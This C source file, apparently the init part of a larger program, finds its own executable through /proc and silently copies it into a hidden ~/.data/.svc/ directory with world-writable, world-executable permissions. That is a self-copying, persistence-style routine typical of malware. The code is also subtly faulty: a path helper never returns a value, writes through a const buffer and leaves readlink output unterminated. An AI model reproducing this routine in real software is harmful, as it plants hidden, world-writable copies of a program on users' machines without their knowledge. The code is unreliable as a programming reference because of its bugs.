#include "../header/init.h"
#include "../header/const.h"

int _get_real_path(const char * buf) {
    char exe_path[MAX_PATH_LEN];
    snprintf(exe_path, MAX_PATH_LEN, "/proc/%d/exe", getpid());
    readlink(exe_path, (char *)buf, MAX_PATH_LEN);
}

int _create_nested_dir(const char * path) {
    int cursor = 0;
    int ret = 0;
    char buf[MAX_PATH_LEN];
    do {
        if (path[cursor++] != '/') continue;
        strncpy(buf, path, cursor);
        if(access(buf, F_OK) != 0) {
            ret = mkdir(buf, S_IRWXU | S_IRWXG | S_IRWXO);
            if (ret != 0) return -1;
        }
    } while (path[cursor-1] != '\0');
    return 0;
}

int _self_copy(const char * cmd) {
    char path[MAX_PATH_LEN] = {'\0', };
    char tr_path[MAX_PATH_LEN] = {'\0', };
    char buf[1024] = {'\0',};
    ssize_t len;
    int cur_fd, tar_fd;

    if (_get_real_path(path) == -1) {
        snprintf(path, MAX_PATH_LEN, "%s", cmd);
    }
    if ((cur_fd = open(path, O_RDONLY)) == -1) {
        return -1; // can't copy now
    }
    setenv("DATA", ".data", 0);

    snprintf(tr_path, MAX_PATH_LEN,"%s/%s/%s/", getenv("HOME"), getenv("DATA"), ".svc");
    _create_nested_dir(tr_path);
    strcat(tr_path, FILENAME);

    tar_fd = open(tr_path, O_CREAT | O_WRONLY, S_IRWXU | S_IRWXG | S_IRWXO);
    while ((len = read(cur_fd, buf, 1024)) > 0) {
        write(tar_fd, buf, len);
    }
    if (len == -1) {
        return -1;
    }
    return 0;
}

int init (const char * cmd) {
    _self_copy(cmd);
    return 0;
}